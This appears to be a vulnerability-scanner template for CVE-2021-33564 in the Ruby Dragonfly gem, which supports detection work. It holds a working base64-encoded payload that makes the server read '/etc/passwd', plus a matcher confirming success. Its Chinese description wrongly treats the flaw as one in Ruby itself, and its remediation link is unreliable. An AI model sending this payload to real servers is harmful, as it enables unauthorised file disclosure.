id: CVE-2021-33564
info:
  name: Ruby Dragonfly <1.4.0 - Remote Code Execution
  author:
  - 0xsapra
  description: |-
    Ruby 参数注入漏洞
    Ruby是松本行弘个人开发者的一种跨平台、面向对象的动态类型编程语言。

    Ruby 1.4.0版本之前存在参数注入漏洞，该漏洞源于Ruby的Dragonfly gem中存在一个参数注入漏洞，当验证URL选项被禁用时，远程攻击者利用该漏洞可以通过一个精心制作的URL读取和写入任意文件。
  severity: high
  remediation: |-
    官方修复方案：
    1、建议用户到官方获取最新补丁或者最新版本程序：
    https://www.ruby-lang.org/en/
requests:
- matchers:
  - type: status
    status:
    - 200
  - type: regex
    regex:
    - 'root:.*:0:0:'
  matchers-condition: and
  path:
  - '{{BaseURL}}/system/images/W1siZyIsICJjb252ZXJ0IiwgIi1zaXplIDF4MSAtZGVwdGggOCBncmF5Oi9ldGMvcGFzc3dkIiwgIm91dCJdXQ=='
  - '{{BaseURL}}/system/refinery/images/W1siZyIsICJjb252ZXJ0IiwgIi1zaXplIDF4MSAtZGVwdGggOCBncmF5Oi9ldGMvcGFzc3dkIiwgIm91dCJdXQ=='
  method: GET
